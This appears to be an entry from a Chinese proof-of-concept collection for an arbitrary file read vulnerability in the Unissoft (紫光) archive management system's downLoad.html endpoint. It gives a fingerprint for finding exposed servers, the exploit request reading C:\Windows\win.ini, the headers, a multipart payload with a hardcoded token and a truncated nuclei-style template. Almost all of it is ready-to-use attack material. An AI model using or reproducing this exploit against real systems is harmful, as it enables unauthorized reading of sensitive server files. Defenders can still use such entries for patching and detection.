# 紫光科技文档管理系统downLoad存在任意文件读取漏洞

- **系统**：紫光科技文档管理系统　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`body="[www.unissoft.com](http://www.unissoft.com"`
- **请求**：`POST /Using/Subject/downLoad.html?path=C:\Windows\win.ini HTTP/1.1`
- **关键头**：`X-Requested-With: XMLHttpRequest`　`Content-Type: multipart/form-data; boundary=----oogxanjqqao14hciujt2`　`Content-Length: 387`　`id: ziguang-dagl-downLoad-fileread`　`name: 紫光档案管理 downLoad.html 任意文件读取漏洞`　`author: custom`　`severity: high`　`description: 紫光档案管理系统 downLoad.html 接口存在任意文件读取漏洞，攻击者可读取服务器任意敏感文件`

**请求体 / payload**
```
------oogxanjqqao14hciujt2
Content-Disposition: form-data; name="userID"
admin
------oogxanjqqao14hciujt2
Content-Disposition: form-data; name="fondsid"
1
------oogxanjqqao14hciujt2
Content-Disposition: form-data; name="comid"
1
------oogxanjqqao14hciujt2
Content-Disposition: form-data; name="token"
5117e82385cef4c12547fdd4c028b97a1-1
------oogxanjqqao14hciujt2--
- raw:
-
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=----{{boundary}}
------{{boundary}}
Content-Disposition: form-data; name="userID"
admin
------{{boundary}}
Content-Disposition: form-data; name="fon…（脚本共 915 字，完整版见原文）
```
- **预期**：200　|　filename